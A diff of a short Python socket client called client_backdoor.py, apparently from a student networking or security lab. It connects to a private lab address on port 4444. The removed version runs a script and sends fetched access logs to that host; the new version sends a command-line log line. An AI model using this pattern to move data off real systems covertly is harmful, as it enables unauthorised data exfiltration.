@@ -1,25 +1,32 @@
 #!/usr/bin/python3
+
 import sys
-import os
 import socket
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-# change host(server_addr)
-server_addr= '192.168.56.101' #server addressse
-port = 4444
+def main():
+    if len(sys.argv) < 2:
+        print("Usage: python3 client_backdoor.py <log_line>")
+        sys.exit(1)
 
-s.connect((server_addr, port))
+    log_line = sys.argv[1]
+    # debug line: prints out the argv1
+    #print(log_line)
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-# fetch log data 
-bash_script='/home/student/Documents/bash_scripts/fetch_acces_logs.sh'
-#os.system(bash_script)
-output = os.popen(bash_script).read()
-print("sending log...")
-message=output
+    # Change host (server_addr)
+    server_addr = '192.168.56.101'  # Server address
+    port = 4444
 
-s.send(message.encode('ascii')) 
+    s.connect((server_addr, port))
+    print("Sending log...")
 
-msg = s.recv(1024) # 4   receive
+    # Send log line to server
+    s.send(log_line.encode('utf-8'))
 
-s.close()
-print (msg.decode('ascii'))
+    msg = s.recv(1024)  # Receive acknowledgment from server
+    s.close()
+    print("Received acknowledgment:", msg.decode('utf-8'))
+
+if __name__ == "__main__":
+
+    main()
